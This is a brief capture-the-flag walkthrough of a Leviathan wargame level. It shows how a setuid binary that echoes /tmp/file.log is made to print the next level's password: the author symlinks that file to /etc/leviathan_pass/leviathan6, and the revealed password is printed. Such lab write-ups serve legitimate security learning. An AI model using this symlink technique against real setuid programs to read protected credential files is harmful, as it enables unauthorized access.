You know the drill. Let's look at what we're working with.

```sh
leviathan5@leviathan:~$ ls
leviathan5
leviathan5@leviathan:~$ ./leviathan5 
Cannot find /tmp/file.log
leviathan5@leviathan:~$ file leviathan5 
leviathan5: setuid ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=ed6f1fe71c4b82ecb323211e4c9b79fa3f8c09ca, not stripped
```

Huh. "Cannot find /tmp/file.log". I wonder what happens if we were to spawn
that file. Of what significance is it to the binary?

```sh
leviathan5@leviathan:~$ touch /tmp/file.log
leviathan5@leviathan:~$ ./leviathan5
```

Okay... that did nothing. Let's ltrace it. Maybe I should try giving the file
some contents.

```sh
leviathan5@leviathan:~$ echo "x" > /tmp/file.log
leviathan5@leviathan:~$ ./leviathan5 
x
```

Looks like it just outputs whatever contents are in the file. What if we were
to create a symbolic link between /tmp/file.log and the password for level 6?

```sh
leviathan5@leviathan:~$ ln -s /etc/leviathan_pass/leviathan6 /tmp/file.log
leviathan5@leviathan:~$ ./leviathan5 
UgaoFee4li
```
